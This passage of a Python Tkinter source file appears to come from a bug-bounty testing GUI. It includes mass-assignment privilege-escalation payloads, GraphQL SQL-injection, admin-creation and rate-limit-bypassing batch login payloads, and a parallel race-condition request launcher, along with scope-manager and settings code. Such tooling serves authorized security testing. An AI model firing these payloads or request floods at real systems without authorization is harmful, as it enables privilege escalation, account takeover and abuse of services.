        self._ma_txt.insert('end', "Mass Assignment Test Payloads:\n\n"
            '{"role": "admin"}\n'
            '{"isAdmin": true}\n'
            '{"admin": true}\n'
            '{"user_type": "admin"}\n'
            '{"balance": 99999}\n'
            '{"verified": true}\n'
            '{"__proto__": {"admin": true}}\n\n'
            "Click 'Test Mass Assignment' to automatically try all payloads.")
        self._ma_txt.config(state='disabled')

    def _run_mass_assign(self):
        url    = self._ma_url.get().strip()
        method = self._ma_method.get()
        if not url: return
        self._ma_txt.config(state='normal'); self._ma_txt.delete('1.0','end')
        self._ma_txt.insert('end', f"[*] Testing mass assignment on {url} [{method}]\n\n")
        self._ma_txt.config(state='disabled')
        def _go():
            r = test_mass_assignment(url, method)
            def _upd():
                self._ma_txt.config(state='normal')
                self._ma_txt.insert('end', f"Tests run: {r['test_count']}\n")
                self._ma_txt.insert('end', f"Potentially vulnerable: {r['potentially_vulnerable']}\n\n")
                for resp in r.get('responses',[]):
                    self._ma_txt.insert('end', f"  Payload: {json.dumps(resp['payload'])}\n")
                    self._ma_txt.insert('end', f"  Status: {resp['status']}  Size: {resp['response_size']}\n\n")
                self._ma_txt.config(state='disabled')
                self.set_status(f"Mass assignment: {'VULNERABLE' if r['potentially_vulnerable'] else 'Not found'}", RED if r['potentially_vulnerable'] else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_ver_fuzz_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "API VERSION FUZZER", "🔢").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Base URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ver_url = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "")
        mk_entry(tr, var=self._ver_url, w=42).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔢 Fuzz Versions", self._run_ver_fuzz, ACCENT, small=True).pack(side='left', padx=4)
        self._ver_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S); self._ver_stat.pack(anchor='w', pady=(0,4))
        cols = ('Version','URL','Status','Size','Sample')
        self._ver_tree = mk_tree(pad, columns=cols, show='headings', height=20)
        for c,w in [('Version',80),('URL',300),('Status',60),('Size',70),('Sample',220)]:
            self._ver_tree.heading(c,text=c); self._ver_tree.column(c, width=w)
        self._ver_tree.tag_configure('found', foreground=GREEN, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._ver_tree.yview)
        self._ver_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._ver_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)
        self._ver_tree.bind('<Double-1>', lambda e: webbrowser.open(
            str(self._ver_tree.item(self._ver_tree.selection()[0])['values'][1])
            if self._ver_tree.selection() else ""))

    def _run_ver_fuzz(self):
        url = self._ver_url.get().strip()
        if not url: return
        self._ver_stat.config(text="Fuzzing API versions...", fg=CYAN)
        self._ver_tree.delete(*self._ver_tree.get_children())
        def _go():
            results = fuzz_api_versions(url)
            def _upd():
                for r in results:
                    tag = 'found' if r.get('status',0) == 200 else 'row'
                    self._ver_tree.insert('','end', values=(
                        r.get('version',''), r.get('url',''), r.get('status',''),
                        r.get('size',''), r.get('sample','')[:50]), tags=(tag,))
                ok = [r for r in results if r.get('status',0) == 200]
                self._ver_stat.config(text=f"Found {len(ok)} active endpoints of {len(results)} tested", fg=GREEN if ok else YELLOW)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _gql_send(self, payload):
        # _gql_url is set by _build_graphql_tab when it runs
        if not self._gql_url: return
        url = self._gql_url.get().strip()
        if not url: return
        import urllib.request as _ur
        try:
            data = json.dumps({"query": payload}).encode()
            req  = _ur.Request(url, data=data, method="POST")
            req.add_header("Content-Type","application/json")
            req.add_header("User-Agent","Mozilla/5.0")
            with _ur.urlopen(req, timeout=10) as r:
                return json.loads(r.read())
        except Exception as e:
            return {"error": str(e)}

    def _gql_introspection(self):
        if self._gql_txt: self._gql_txt and self._gql_txt.config(state='normal'); self._gql_txt.delete('1.0','end')
        self._gql_txt and self._gql_txt.insert('end', "[*] Running introspection query...\n"); self._gql_txt and self._gql_txt.config(state='disabled')
        def _go():
            r = self._gql_send("{__schema{types{name kind}}}")
            def _upd():
                self._gql_txt and self._gql_txt.config(state='normal')
                if "error" in r:
                    self._gql_txt and self._gql_txt.insert('end', f"[!] Error: {r['error']}\n[!] Introspection may be disabled\n")
                else:
                    types = r.get('data',{}).get('__schema',{}).get('types',[])
                    self._gql_txt and self._gql_txt.insert('end', f"[+] Introspection enabled! {len(types)} types found:\n\n")
                    for t in types:
                        if not t.get('name','').startswith('__'):
                            self._gql_txt and self._gql_txt.insert('end', f"  {t.get('kind',''):<10} {t.get('name','')}\n")
                self._gql_txt and self._gql_txt.config(state='disabled')
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _gql_injection(self):
        if self._gql_txt: self._gql_txt and self._gql_txt.config(state='normal'); self._gql_txt.delete('1.0','end')
        self._gql_txt and self._gql_txt.insert('end', "GRAPHQL INJECTION PAYLOADS:\n\n"
            '{"query":"{user(id:\\"1 OR 1=1\\"){id email}}"}\n'
            '{"query":"{searchUser(name:\\"admin\\\' OR 1=1--\\"){id}}"}\n'
            '{"query":"{__schema{types{name}}}"}\n'
            '{"query":"mutation{createUser(role:\\"admin\\",user:\\"hacker\\",pass:\\"hacked\\"){id}}"}\n\n'
            "BATCH ATTACK (bypass rate limits):\n"
            '[{"query":"{l1:login(u:\\"admin\\",p:\\"pass1\\"){token}}"},\n'
            ' {"query":"{l2:login(u:\\"admin\\",p:\\"pass2\\"){token}}"},\n'
            ' {"query":"{l3:login(u:\\"admin\\",p:\\"pass3\\"){token}}"}]\n')
        self._gql_txt and self._gql_txt.config(state='disabled')

    def _gql_common(self):
        if self._gql_txt: self._gql_txt and self._gql_txt.config(state='normal'); self._gql_txt.delete('1.0','end')
        self._gql_txt and self._gql_txt.insert('end', "COMMON GRAPHQL QUERIES TO TEST:\n\n"
            "Users: {users{id email password role admin}}\n"
            "Me: {me{id email role permissions}}\n"
            "Admin: {adminUsers{id email}}\n"
            "Files: {files{id name path url}}\n"
            "Posts: {posts{id title body user{email}}}\n\n"
            "Tool: graphql-cop (security audit tool)\n"
            "Tool: clairvoyance (schema extraction without introspection)\n")
        self._gql_txt and self._gql_txt.config(state='disabled')

    # ═══════════════════════════════════════════════════════════════
    #  TIER 2 — BUG BOUNTY PROGRAM MANAGER
    # ═══════════════════════════════════════════════════════════════
    def _build_bb_manager(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        prog_f  = tk.Frame(nb2, bg=BG2); nb2.add(prog_f,  text="  💼 Programs  ")
        scope_f = tk.Frame(nb2, bg=BG2); nb2.add(scope_f, text="  🎯 Scope Manager  ")
        earn_f  = tk.Frame(nb2, bg=BG2); nb2.add(earn_f,  text="  💰 Earnings  ")
        self._build_programs_tab(prog_f)
        self._build_scope_tab(scope_f)
        self._build_earnings_tab(earn_f)

    def _build_programs_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "BUG BOUNTY PROGRAMS", "💼").pack(fill='x', pady=(0,8))
        br = mk_frame(pad, bg=BG2); br.pack(fill='x', pady=(0,8))
        mk_btn(br, "🌐 Load Public Programs", self._bb_load_public, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(br, "🌐 HackerOne Directory",  lambda: webbrowser.open("https://hackerone.com/directory"), CYAN, small=True).pack(side='left', padx=4)
        mk_btn(br, "🌐 Bugcrowd Programs",    lambda: webbrowser.open("https://bugcrowd.com/programs"), GREEN, small=True).pack(side='left', padx=4)
        mk_btn(br, "🌐 Intigriti",            lambda: webbrowser.open("https://app.intigriti.com/programs"), YELLOW, small=True).pack(side='left', padx=4)
        self._bb_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S); self._bb_stat.pack(anchor='w', pady=(0,4))
        cols = ('Program','Platform','Bounty','Scope','URL')
        self._bb_tree = mk_tree(pad, columns=cols, show='headings', height=22)
        for c,w in [('Program',200),('Platform',100),('Bounty',120),('Scope',200),('URL',250)]:
            self._bb_tree.heading(c,text=c); self._bb_tree.column(c, width=w)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._bb_tree.yview)
        self._bb_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._bb_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)
        self._bb_tree.bind('<Double-1>', lambda e: webbrowser.open(
            str(self._bb_tree.item(self._bb_tree.selection()[0])['values'][4])
            if self._bb_tree.selection() else ""))
        self._bb_load_public()

    def _bb_load_public(self):
        self._bb_tree.delete(*self._bb_tree.get_children())
        self._bb_stat.config(text="⏳ Loading programs...", fg=CYAN)
        def _go():
            progs = get_public_programs_list()
            def _upd():
                self._bb_tree.delete(*self._bb_tree.get_children())
                for p in progs:
                    self._bb_tree.insert('','end', values=(
                        p.get('name',''), p.get('platform',''),
                        p.get('bounty',''), p.get('scope',''), p.get('url','')))
                self._bb_stat.config(
                    text=f"✅ {len(progs)} programs loaded  |  Double-click to open program",
                    fg=GREEN)
                self.set_status(f"BB Manager: {len(progs)} programs", GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_scope_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "SCOPE MANAGER", "🎯").pack(fill='x', pady=(0,8))
        # In-scope
        tk.Label(pad, text="IN SCOPE:", bg=BG2, fg=GREEN, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._scope_in_txt = mk_stext(pad, h=8, bg=BG3, fg=GREEN)
        self._scope_in_txt.pack(fill='x', pady=(0,8))
        self._scope_in_txt.insert('end', "*.example.com\nhttps://api.example.com\nhttps://app.example.com")
        # Out-of-scope
        tk.Label(pad, text="OUT OF SCOPE:", bg=BG2, fg=RED, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._scope_out_txt = mk_stext(pad, h=8, bg=BG3, fg=RED)
        self._scope_out_txt.pack(fill='x', pady=(0,8))
        self._scope_out_txt.insert('end', "https://status.example.com\nhttps://docs.example.com")
        # Checker
        ck_f = mk_frame(pad, bg=BG2); ck_f.pack(fill='x', pady=(0,8))
        tk.Label(ck_f, text="Check URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._scope_check_var = tk.StringVar()
        mk_entry(ck_f, var=self._scope_check_var, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(ck_f, "✓ Check Scope", self._check_scope, ACCENT, small=True).pack(side='left', padx=4)
        self._scope_result = tk.Label(pad, text="", bg=BG2, font=MONO_B); self._scope_result.pack(anchor='w')

    def _check_scope(self):
        url   = self._scope_check_var.get().strip()
        scope_in  = self._scope_in_txt.get('1.0','end').strip().splitlines()
        scope_out = self._scope_out_txt.get('1.0','end').strip().splitlines()
        # Check out-of-scope first
        for pattern in scope_out:
            pattern = pattern.strip()
            if not pattern: continue
            if pattern.replace('*','') in url or url in pattern.replace('*',''):
                self._scope_result.config(text=f"✗ OUT OF SCOPE: {url}", fg=RED); return
        # Check in-scope
        for pattern in scope_in:
            pattern = pattern.strip()
            if not pattern: continue
            clean = pattern.replace('*.','').replace('*','')
            if clean and (clean in url or url.endswith(clean)):
                self._scope_result.config(text=f"✓ IN SCOPE: {url}", fg=GREEN); return
        self._scope_result.config(text=f"? UNCLEAR — verify manually: {url}", fg=YELLOW)

    def _build_earnings_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "EARNINGS TRACKER", "💰").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,12))
        # Stats
        findings = load_findings()
        total = len(findings)
        crit  = sum(1 for f in findings if f.get('severity','').upper() == 'CRITICAL')
        high  = sum(1 for f in findings if f.get('severity','').upper() == 'HIGH')
        med   = sum(1 for f in findings if f.get('severity','').upper() == 'MEDIUM')
        sf = mk_frame(info, bg=BG3); sf.pack(fill='x', padx=12, pady=12)
        for label, val, clr in [
            ("Total Findings", str(total), FG),
            ("Critical", str(crit), RED),
            ("High", str(high), YELLOW),
            ("Medium", str(med), CYAN),
        ]:
            c = mk_frame(sf, bg=BG3); c.pack(side='left', fill='both', expand=True, padx=8)
            tk.Label(c, text=val,   bg=BG3, fg=clr, font=MONO_L).pack()
            tk.Label(c, text=label, bg=BG3, fg=FG3, font=MONO_T).pack()
        txt = mk_stext(pad, h=22, bg=BG3, fg=FG); txt.pack(fill='both', expand=True)
        txt.insert('end', "EARNINGS ESTIMATE (Based on your findings):\n\n")
        from modules.ai.auto_exploit import estimate_bounty
        for f in findings[:10]:
            sev   = f.get('severity','LOW')
            vtype = f.get('type', 'Unknown')
            try: cvss = float(f.get('cvss_score','5.0') or 5.0)
            except: cvss = 5.0
            est = estimate_bounty(vtype, cvss, "HackerOne", "medium")
            txt.insert('end', f"  [{sev}] {f.get('title','')[:50]}\n")
            txt.insert('end', f"    Estimate: {est['estimate_low']} — {est['estimate_high']}\n\n")
        txt.config(state='disabled')

    # ═══════════════════════════════════════════════════════════════
    #  TIER 3 — BUSINESS LOGIC HUNTER
    # ═══════════════════════════════════════════════════════════════
    def _build_biz_logic(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        for cat_name in BUSINESS_LOGIC_CHECKS.keys():
            f = tk.Frame(nb2, bg=BG2)
            short = cat_name[:18]
            nb2.add(f, text=f"  {short}  ")
            self._build_biz_cat_tab(f, cat_name)
        # Extra: Race Condition tab
        rc_f = tk.Frame(nb2, bg=BG2); nb2.add(rc_f, text="  ⚡ Race Condition  ")
        self._build_race_condition_tab(rc_f)

    def _build_biz_cat_tab(self, frame, category):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, category.upper(), "🧬").pack(fill='x', pady=(0,8))
        checks = BUSINESS_LOGIC_CHECKS.get(category, [])
        # Checkboxes for each check
        check_vars = []
        for check in checks:
            var = tk.BooleanVar(value=False)
            check_vars.append((var, check))
            fr = mk_frame(pad, bg=BG2); fr.pack(fill='x', pady=2)
            ttk.Checkbutton(fr, text=check, variable=var,
                           wraplength=750, justify='left').pack(anchor='w')

        # Notes
        tk.Label(pad, text="Notes:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(10,4))
        notes_txt = mk_stext(pad, h=6, bg=BG3, fg=FG); notes_txt.pack(fill='x')

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        def save_progress():
            done = [c for v, c in check_vars if v.get()]
            notes = notes_txt.get('1.0','end').strip()
            self.set_status(f"{category}: {len(done)}/{len(checks)} checked", GREEN)
        mk_btn(bf, "💾 Save Progress", save_progress, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "✓ Mark All", lambda: [v.set(True) for v,_ in check_vars], CYAN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "✗ Clear All", lambda: [v.set(False) for v,_ in check_vars], FG3, small=True).pack(side='left', padx=4)

    def _build_race_condition_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "RACE CONDITION TESTER", "⚡").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._race_url = tk.StringVar(value=f"https://{self.project.get()}/api/redeem" if self.project.get() else "")
        mk_entry(tr, var=self._race_url, w=40).pack(side='left', padx=8, ipady=3)
        tk.Label(tr, text="Threads:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._race_threads = tk.StringVar(value="20")
        ttk.Combobox(tr, textvariable=self._race_threads, values=["5","10","20","50","100"], width=6, font=MONO_S).pack(side='left')
        mk_btn(tr, "⚡ Launch Race", self._run_race_condition, RED, small=True).pack(side='right', padx=4, ipady=4)
        self._race_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S); self._race_stat.pack(anchor='w', pady=(0,4))
        self._race_txt = mk_stext(pad, h=16, bg=BG3, fg=FG); self._race_txt.pack(fill='x', pady=(0,8))
        self._race_txt.insert('end', "RACE CONDITION TESTING\n\n"
            "Method: Send N parallel requests simultaneously\n\n"
            "Common targets:\n"
            "  • Coupon/voucher redemption endpoints\n"
            "  • Account balance/withdrawal\n"
            "  • Vote/like/upvote endpoints\n"
            "  • Email verification links\n"
            "  • Password reset tokens\n\n"
            "Tool: turbo-intruder (Burp Suite extension)\n"
            "Tool: ffuf -race flag\n"
            "Tool: race-the-web (GitHub)")
        self._race_txt.config(state='disabled')
        tk.Label(pad, text="Custom Body (JSON):", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,4))
        self._race_body = mk_stext(pad, h=4, bg=BG3, fg=FG); self._race_body.pack(fill='x')
        self._race_body.insert('end', '{"coupon": "SAVE50", "amount": 100}')

    def _run_race_condition(self):
        url = self._race_url.get().strip()
        if not url: return
        try: n = int(self._race_threads.get())
        except: n = 20
        body = self._race_body.get('1.0','end').strip()
        self._race_stat.config(text=f"Launching {n} parallel requests...", fg=CYAN)
        import urllib.request as _ur
        results = []
        def _single():
            try:
                data = body.encode() if body else None
                req  = _ur.Request(url, data=data, method="POST" if data else "GET")
                if data: req.add_header("Content-Type","application/json")
                req.add_header("User-Agent","Mozilla/5.0")
                with _ur.urlopen(req, timeout=8) as r:
                    resp_body = r.read().decode(errors='replace')[:200]
                    results.append({"status": r.status, "body": resp_body[:100]})
            except urllib.error.HTTPError as e:
                results.append({"status": e.code, "body": ""})
            except Exception as e:
                results.append({"status": 0, "error": str(e)})
        threads = [threading.Thread(target=_single, daemon=True) for _ in range(n)]
        for t in threads: t.start()
        def _wait():
            for t in threads: t.join(timeout=15)
            def _upd():
                self._race_txt.config(state='normal'); self._race_txt.delete('1.0','end')
                self._race_txt.insert('end', f"Race condition test: {n} requests sent\n\n")
                status_counts = {}
                for r in results:
                    s = r.get('status',0)
                    status_counts[s] = status_counts.get(s,0) + 1
                self._race_txt.insert('end', "Status code distribution:\n")
                for code, count in sorted(status_counts.items()):
                    self._race_txt.insert('end', f"  HTTP {code}: {count} responses\n")
                # Different body responses may indicate race condition
                bodies = set(r.get('body','')[:50] for r in results if r.get('body'))
                self._race_txt.insert('end', f"\nUnique response bodies: {len(bodies)}\n")
                if len(bodies) > 1:
                    self._race_txt.insert('end', "[!!!] Multiple different responses — possible race condition!\n")
                self._race_txt.config(state='disabled')
                self._race_stat.config(
                    text=f"Done: {len(results)} responses, {len(bodies)} unique bodies",
                    fg=RED if len(bodies) > 1 else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_wait, daemon=True).start()


    def _build_settings(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        tabs = [
            ("  🔑 API Keys  ",      self._settings_api),
            ("  🔌 Proxy/Burp  ",   self._settings_proxy),
            ("  🌐 VPN/IP  ",        self._settings_vpn),
            ("  🔔 Notify  ",        self._settings_notify),
            ("  👥 Users  ",         self._settings_users),
            ("  📝 Audit Log  ",     self._settings_audit),
            ("  📂 Wordlists  ",     self._settings_wordlists),
            ("  🔧 Tool Installer ", self._settings_tool_installer),
            ("  🎯 Scope Manager ",  self._settings_scope_manager),
        ]
        if self.user.get("role") == "admin":
            tabs += [
                ("  🖥 System  ",         self._settings_system),
                ("  📦 Import/Export  ",  self._settings_bulk),
            ]
        for title, builder in tabs:
            f = tk.Frame(nb2, bg=BG2); nb2.add(f, text=title); builder(f)

    def _settings_api(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=10)
        # Scrollable frame
        canvas = tk.Canvas(pad, bg=BG2, highlightthickness=0)
        scrollbar = ttk.Scrollbar(pad, orient='vertical', command=canvas.yview)
        inner = mk_frame(canvas, bg=BG2)
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

        mk_section(inner, "API KEY CONFIGURATION", "🔑").pack(fill='x', pady=(0,8), padx=4)
        tk.Label(inner, text="  All API keys are stored locally in config.json — never sent anywhere",
                 bg=BG2, fg=FG3, font=MONO_T).pack(anchor='w', padx=8, pady=(0,8))

        API_GROUPS = [
            ("🤖 AI PROVIDERS", [
                ("anthropic_api_key", "Claude (Anthropic)",  "console.anthropic.com",          True),
                ("gemini_api_key",    "Gemini (Google)",     "aistudio.google.com",            True),
                ("openai_api_key",    "OpenAI GPT",          "platform.openai.com/api-keys",   True),
            ]),
            ("🔍 RECON & INTEL", [
                ("shodan",            "Shodan",              "shodan.io/account",              True),
                ("censys_id",         "Censys ID",           "search.censys.io/account",       False),
                ("censys_secret",     "Censys Secret",       "search.censys.io/account",       True),
                ("securitytrails",    "SecurityTrails",      "securitytrails.com/corp/api",    True),
                ("virustotal",        "VirusTotal",          "virustotal.com/gui/join",        True),
                ("hunter_api_key",    "Hunter.io (Emails)",  "hunter.io/api-keys",             True),
                ("nvd_api_key",       "NVD API (CVEs)",      "nvd.nist.gov/developers",        True),
                ("github_token",      "GitHub Token",        "github.com/settings/tokens",     True),
            ]),
            ("💼 BUG BOUNTY PLATFORMS", [
                ("hackerone_username","HackerOne Username",  "Your H1 handle",                 False),
                ("hackerone_token",   "HackerOne API Token", "hackerone.com/settings/api_token",True),
                ("bugcrowd_email",    "Bugcrowd Email",      "Your Bugcrowd email",            False),
                ("bugcrowd_token",    "Bugcrowd API Token",  "bugcrowd.com/user/api_token",    True),
            ]),
            ("🔔 NOTIFICATIONS", [
                ("slack_webhook",     "Slack Webhook URL",   "api.slack.com/apps",             True),
                ("discord_webhook",   "Discord Webhook URL", "discord.com/developers/docs",    True),
                ("telegram_token",    "Telegram Bot Token",  "t.me/BotFather",                 True),
                ("telegram_chat_id",  "Telegram Chat ID",    "@userinfobot to get your ID",    False),
            ]),
        ]

        cfg = load_cfg()
        for group_name, fields in API_GROUPS:
            mk_section(inner, group_name, "").pack(fill='x', padx=4, pady=(12,4))
            for key, label, hint, is_secret in fields:
                r = mk_frame(inner, bg=BG2); r.pack(fill='x', padx=8, pady=3)
                tk.Label(r, text=label+":", bg=BG2, fg=FG2, font=MONO_S, width=24, anchor='e').pack(side='left')
                val = cfg.get("api_keys",{}).get(key,"")
                var = tk.StringVar(value=val)
                self.api_vars[key] = var
                ent = mk_entry(r, var=var, w=44, show="●" if is_secret else "")
                ent.pack(side='left', padx=8, ipady=3)
                tk.Label(r, text=hint, bg=BG2, fg=FG3, font=MONO_T).pack(side='left', padx=4)
                # Show/hide toggle for secrets
                if is_secret:
                    def _toggle(e=ent, v=var):
                        e.config(show="" if e.cget('show') else "●")
                    mk_btn(r, "👁", _toggle, FG3, small=True).pack(side='left', padx=2)

        def save_keys():
            cfg2 = load_cfg()
            for k, v in self.api_vars.items():
                if v.get(): cfg2["api_keys"][k] = v.get()
            save_cfg(cfg2)
            messagebox.showinfo("Saved", "All API keys saved!", parent=self.root)
            self.set_status("API keys saved ✓", GREEN)

        mk_btn(inner, "💾 Save All API Keys", save_keys, GREEN).pack(pady=16, anchor='w', padx=8)

        # Quick links
        mk_section(inner, "QUICK SETUP LINKS", "🌐").pack(fill='x', padx=4, pady=(8,4))
        links_f = mk_frame(inner, bg=BG2); links_f.pack(fill='x', padx=8, pady=(0,16))
        link_defs = [
            ("Hunter.io (free)",    "https://hunter.io/api-keys"),
            ("NVD API (free)",      "https://nvd.nist.gov/developers/request-an-api-key"),
            ("Shodan",              "https://account.shodan.io/"),
            ("GitHub Token",        "https://github.com/settings/tokens"),
            ("HackerOne API",       "https://hackerone.com/settings/api_token"),
        ]
        for i, (name, url) in enumerate(link_defs):
            r, c = divmod(i, 3)
            mk_btn(links_f, f"🌐 {name}", lambda u=url: webbrowser.open(u), FG3, small=True).grid(row=r, column=c, padx=4, pady=2, sticky='w')

    def _settings_notify(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=24, pady=16)
        mk_section(pad, "NOTIFICATION SETTINGS", "🔔").pack(fill='x', pady=(0,12))
        cfg = load_cfg(); n = cfg.get("notify",{}); em = n.get("email",{})
        for key, label, value in [("slack_webhook","Slack Webhook URL",n.get("slack_webhook","")),
                                    ("discord_webhook","Discord Webhook URL",n.get("discord_webhook",""))]:
            r = mk_frame(pad, bg=BG2); r.pack(fill='x', pady=5)
            tk.Label(r, text=label+":", bg=BG2, fg=FG2, font=MONO_S, width=22, anchor='e').pack(side='left')
            var = tk.StringVar(value=value); self.notify_vars[key] = var
            mk_entry(r, var=var, w=46).pack(side='left', padx=8, ipady=3)
            chan = "slack" if "slack" in key else "discord"
            mk_btn(r, "Test", lambda c=chan: threading.Thread(
                target=lambda: messagebox.showinfo("Test", notifier.test_notification(c), parent=self.root),
                daemon=True).start(), FG3, small=True).pack(side='left')
        mk_section(pad, "EMAIL SMTP", "📧").pack(fill='x', pady=(16,8))
        for key, label, value, w, show in [
            ("email_smtp_host","SMTP Host",em.get("smtp_host","smtp.gmail.com"),24,False),
            ("email_smtp_port","SMTP Port",str(em.get("smtp_port",587)),6,False),
            ("email_username","Username",em.get("username",""),30,False),
            ("email_password","Password",em.get("password",""),30,True),
            ("email_recipient","Recipient",em.get("recipient",""),30,False)]:
            r = mk_frame(pad, bg=BG2); r.pack(fill='x', pady=4)
            tk.Label(r, text=label+":", bg=BG2, fg=FG2, font=MONO_S, width=14, anchor='e').pack(side='left')
            var = tk.StringVar(value=value); self.notify_vars[key] = var
            e = mk_entry(r, var=var, w=w)
            if show: e.config(show='●')
            e.pack(side='left', padx=8, ipady=3)
        def save_notify():
            cfg = load_cfg()
            cfg["notify"]["slack_webhook"]   = self.notify_vars.get("slack_webhook",tk.StringVar()).get()
            cfg["notify"]["discord_webhook"] = self.notify_vars.get("discord_webhook",tk.StringVar()).get()
            cfg["notify"]["email"] = {
                "smtp_host": self.notify_vars.get("email_smtp_host",tk.StringVar(value="smtp.gmail.com")).get(),
                "smtp_port": int(self.notify_vars.get("email_smtp_port",tk.StringVar(value="587")).get()),
                "username":  self.notify_vars.get("email_username",tk.StringVar()).get(),
                "password":  self.notify_vars.get("email_password",tk.StringVar()).get(),
                "recipient": self.notify_vars.get("email_recipient",tk.StringVar()).get(),
            }
            save_cfg(cfg); messagebox.showinfo("Saved","Notifications saved!", parent=self.root)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=12)
        mk_btn(bf, "💾 Save", save_notify, GREEN).pack(side='left', padx=4)
        mk_btn(bf, "📧 Test Email", lambda: threading.Thread(
            target=lambda: messagebox.showinfo("Test", notifier.test_notification("email"), parent=self.root),
            daemon=True).start(), CYAN, small=True).pack(side='left', padx=4)

    def _settings_users(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2)
        pad.pack(fill='both', expand=True, padx=20, pady=12)

        if self.user.get("role") != "admin":
            tk.Label(pad, text="⚠  Admin access required",
                     bg=BG2, fg=RED, font=MONO_H).pack(expand=True)
            return

        # ── Top bar ───────────────────────────────────────────────
        mk_section(pad, "USER MANAGEMENT", "👥").pack(fill='x', pady=(0,6))

        stats_card = mk_card(pad); stats_card.pack(fill='x', pady=(0,8))
        sf = mk_frame(stats_card, bg=BG3); sf.pack(fill='x', padx=12, pady=8)
        self._user_count_lbl = tk.Label(sf, text="Loading...",
                                         bg=BG3, fg=FG2, font=MONO_S)
        self._user_count_lbl.pack(side='left')

        # ── Treeview ──────────────────────────────────────────────
        cols = ("Username", "Role", "Email", "Created", "Status")
        self._user_tree = mk_tree(pad, columns=cols, show='headings', height=18)
        widths = {"Username":160, "Role":90, "Email":220, "Created":110, "Status":100}
        for c in cols:
            self._user_tree.heading(c, text=c, anchor='w')
            self._user_tree.column(c, width=widths.get(c,120), anchor='w')
        self._user_tree.tag_configure("admin",    foreground=ACCENT,  background=BG3)
        self._user_tree.tag_configure("member",   foreground=GREEN,   background=BG3)
        self._user_tree.tag_configure("inactive", foreground=RED,     background=BG3)
        self._user_tree.tag_configure("default",  foreground=FG,      background=BG3)

        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._user_tree.yview)
        self._user_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2)
        tf.pack(fill='both', expand=True, pady=(0,8))
        self._user_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)

        # ── Populate ──────────────────────────────────────────────
        def refresh_users():
            self._user_tree.delete(*self._user_tree.get_children())
            users = auth.list_users()
            total   = len(users)
            admins  = sum(1 for u in users if u.get('role') == 'admin')
            active  = sum(1 for u in users if u.get('active', True))
            for u in users:
                is_active = u.get('active', True)
                role      = u.get('role', 'member')
                tag       = role if is_active else 'inactive'
                self._user_tree.insert("", "end",
                    values=(
                        str(u.get('username', '')),
                        str(role).upper(),
                        str(u.get('email', '')),
